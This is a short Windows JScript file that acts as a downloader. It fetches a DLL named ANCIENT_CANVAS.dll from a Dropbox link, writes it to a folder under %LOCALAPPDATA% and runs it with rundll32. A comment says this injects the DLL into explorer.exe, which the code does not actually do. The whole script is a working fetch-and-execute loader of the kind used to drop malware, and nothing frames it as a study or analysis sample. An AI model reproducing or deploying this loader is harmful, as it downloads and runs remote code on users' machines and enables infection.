try {
    // Create WScript.Shell and FileSystemObject instances
    var objShell = new ActiveXObject("WScript.Shell");
    var fso = new ActiveXObject("Scripting.FileSystemObject");

    // Define URL and target file path
    var url = "https://www.dropbox.com/scl/fi/1vos32664821c9kwu4rrv/ANCIENT_CANVAS.dll?rlkey=ssokz83a932t4arjja976bto7&st=e83e72qh&dl=1";
    var target = objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%\\DownloadedFolder\\ANCIENT_CANVAS.dll");

    // Ensure the target directory exists
    var folderPath = objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%\\DownloadedFolder");
    if (!fso.FolderExists(folderPath)) {
        fso.CreateFolder(folderPath);
    }

    // Create XMLHttpRequest object to download the DLL
    var xhr = new ActiveXObject("MSXML2.XMLHTTP");
    xhr.open("GET", url, false);
    xhr.send();

    // Create ADODB.Stream object to save the DLL to file
    var stream = new ActiveXObject("ADODB.Stream");
    stream.Type = 1; // Binary
    stream.Open();
    stream.Write(xhr.responseBody);
    stream.SaveToFile(target, 2); // Overwrite if exists
    stream.Close();

    // Inject the DLL into explorer.exe using rundll32
    objShell.Run("rundll32.exe " + target + ",#1");

} catch (e) {
    // Error handling
    WScript.Echo("Error: " + e.message);
}
